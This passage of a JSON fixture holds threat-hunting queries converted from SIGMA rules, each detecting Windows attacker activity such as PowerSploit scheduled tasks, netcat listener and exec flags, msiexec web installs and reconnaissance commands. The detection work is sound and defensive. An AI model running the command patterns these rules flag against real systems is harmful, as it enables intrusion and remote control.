            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a schtask via PowerSploit or Empire Default Configuration.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053",
                "t1059"
            ],
            "name": "HackTool - Default PowerSploit/Empire Scheduled Task Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/Create\" and tgt.process.cmdline contains \"powershell.exe -NonI\" and tgt.process.cmdline contains \"/TN Updater /TR\") and (tgt.process.cmdline contains \"/SC ONLOGON\" or tgt.process.cmdline contains \"/SC DAILY /ST\" or tgt.process.cmdline contains \"/SC ONIDLE\" or tgt.process.cmdline contains \"/SC HOURLY\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 797
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects addition of users to highly privileged groups via \"Net\" or \"Add-LocalGroupMember\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1098"
            ],
            "name": "User Added To Highly Privileged Group",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"localgroup \" and tgt.process.cmdline contains \" /add\") or (tgt.process.cmdline contains \"Add-LocalGroupMember \" and tgt.process.cmdline contains \" -Group \")) and (tgt.process.cmdline contains \"Group Policy Creator Owners\" or tgt.process.cmdline contains \"Schema Admins\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 798
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - AnyDesk Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\AnyDesk.exe\" or tgt.process.displayName=\"AnyDesk\" or tgt.process.displayName=\"AnyDesk\" or tgt.process.publisher=\"AnyDesk Software GmbH\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 799
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of \"Setup16.EXE\" and old installation utility with a custom \".lst\" file.\nThese \".lst\" file can contain references to external program that \"Setup16.EXE\" will execute.\nAttackers and adversaries might leverage this as a living of the land utility.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Setup16.EXE Execution With Custom .Lst File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path=\"C:\\Windows\\SysWOW64\\setup16.exe\" and src.process.cmdline contains \" -m \") and (not tgt.process.image.path contains \"C:\\~MSSETUP.T\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 800
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious reconnaissance command line activity on Windows systems using the PowerShell Get-LocalGroupMember Cmdlet",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087"
            ],
            "name": "Suspicious Reconnaissance Activity Using Get-LocalGroupMember Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Get-LocalGroupMember \" and (tgt.process.cmdline contains \"domain admins\" or tgt.process.cmdline contains \" administrator\" or tgt.process.cmdline contains \" administrateur\" or tgt.process.cmdline contains \"enterprise admins\" or tgt.process.cmdline contains \"Exchange Trusted Subsystem\" or tgt.process.cmdline contains \"Remote Desktop Users\" or tgt.process.cmdline contains \"Utilisateurs du Bureau \u00e0 distance\" or tgt.process.cmdline contains \"Usuarios de escritorio remoto\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 801
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of Windows Problem Steps Recorder (psr.exe), a utility used to record the user screen and clicks.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1113"
            ],
            "name": "Screen Capture Activity Via Psr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\Psr.exe\" and (tgt.process.cmdline contains \"/start\" or tgt.process.cmdline contains \"-start\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 802
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a code page switch in command line or batch scripts to a rare language",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious CodePage Switch Via CHCP",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\chcp.com\" and (tgt.process.cmdline contains \" 936\" or tgt.process.cmdline contains \" 1258\"))) | columns src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 803
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious encoded character syntax often used for defense evasion",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1027"
            ],
            "name": "Potential PowerShell Obfuscation Via WCHAR",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"(WCHAR)0x\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 804
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1095"
            ],
            "name": "PUA - Netcat Suspicious Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\nc.exe\" or tgt.process.image.path contains \"\\ncat.exe\" or tgt.process.image.path contains \"\\netcat.exe\") or (tgt.process.cmdline contains \" -lvp \" or tgt.process.cmdline contains \" -lvnp\" or tgt.process.cmdline contains \" -l -v -p \" or tgt.process.cmdline contains \" -lv -p \" or tgt.process.cmdline contains \" -l --proxy-type http \" or tgt.process.cmdline contains \" -vnl --exec \" or tgt.process.cmdline contains \" -vnl -e \" or tgt.process.cmdline contains \" --lua-exec \" or tgt.process.cmdline contains \" --sh-exec \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 805
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "ImagingDevices Unusual Parent/Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\WmiPrvSE.exe\" or src.process.image.path contains \"\\svchost.exe\" or src.process.image.path contains \"\\dllhost.exe\") and tgt.process.image.path contains \"\\ImagingDevices.exe\") or src.process.image.path contains \"\\ImagingDevices.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 806
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1018"
            ],
            "name": "Suspicious Scan Loop Network",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"for \" or tgt.process.cmdline contains \"foreach \") and (tgt.process.cmdline contains \"nslookup\" or tgt.process.cmdline contains \"ping\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 807
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious msiexec process starts with web addresses as parameter",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1105"
            ],
            "name": "MsiExec Web Install",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" msiexec\" and tgt.process.cmdline contains \"://\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 808
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects attackers using tooling with bad opsec defaults.\nE.g. spawning a sacrificial process to inject a capability into the process without taking into account how the process is normally run.\nOne trivial example of this is using rundll32.exe without arguments as a sacrificial process (default in CS, now highlighted by c2lint), running WerFault without arguments (Kraken - credit am0nsec), and other examples.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Bad Opsec Defaults Sacrificial Processes With Improper Arguments",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\WerFault.exe\" and tgt.process.cmdline contains \"WerFault.exe\") or (tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"rundll32.exe\") or (tgt.process.image.path contains \"\\regsvcs.exe\" and tgt.process.cmdline contains \"regsvcs.exe\") or (tgt.process.image.path contains \"\\regasm.exe\" and tgt.process.cmdline contains \"regasm.exe\") or (tgt.process.image.path contains \"\\regsvr32.exe\" and tgt.process.cmdline contains \"regsvr32.exe\")) and (not ((src.process.image.path contains \"\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{\" and tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"rundll32.exe\") or ((src.process.image.path contains \"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Application\\\" or src.process.image.path contains \"\\AppData\\Local\\Google\\Chrome\\Application\\\") and src.process.image.path contains \"\\Installer\\setup.exe\" and src.process.cmdline contains \"--uninstall \" and tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"rundll32.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 809
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a set of suspicious network related commands often used in recon stages",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087",
                "t1082"
            ],
            "name": "Network Reconnaissance Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"nslookup\" and tgt.process.cmdline contains \"_ldap._tcp.dc._msdcs.\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 810
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Checks whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Execution Of Non-Existing File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((not tgt.process.image.path contains \"\\\") and (not (not (tgt.process.image.path matches \"\\.*\") or (tgt.process.image.path in (\"-\",\"\")) or ((tgt.process.image.path in (\"System\",\"Registry\",\"MemCompression\",\"vmmem\")) or (tgt.process.cmdline in (\"Registry\",\"MemCompression\",\"vmmem\")))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 811
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\nThis is used as an obfuscation and masquerading techniques.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Potential Defense Evasion Via Right-to-Left Override",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"\u202e\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 812
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects use of chcp to look up the system locale value as part of host discovery",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1614"
            ],
            "name": "Console CodePage Lookup Via CHCP",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\cmd.exe\" and (src.process.cmdline contains \" -c \" or src.process.cmdline contains \" /c \" or src.process.cmdline contains \" \u2013c \" or src.process.cmdline contains \" \u2014c \" or src.process.cmdline contains \" \u2015c \" or src.process.cmdline contains \" -r \" or src.process.cmdline contains \" /r \" or src.process.cmdline contains \" \u2013r \" or src.process.cmdline contains \" \u2014r \" or src.process.cmdline contains \" \u2015r \" or src.process.cmdline contains \" -k \" or src.process.cmdline contains \" /k \" or src.process.cmdline contains \" \u2013k \" or src.process.cmdline contains \" \u2014k \" or src.process.cmdline contains \" \u2015k \") and tgt.process.image.path contains \"\\chcp.com\" and (tgt.process.cmdline contains \"chcp\" or tgt.process.cmdline contains \"chcp \" or tgt.process.cmdline contains \"chcp  \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 813
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
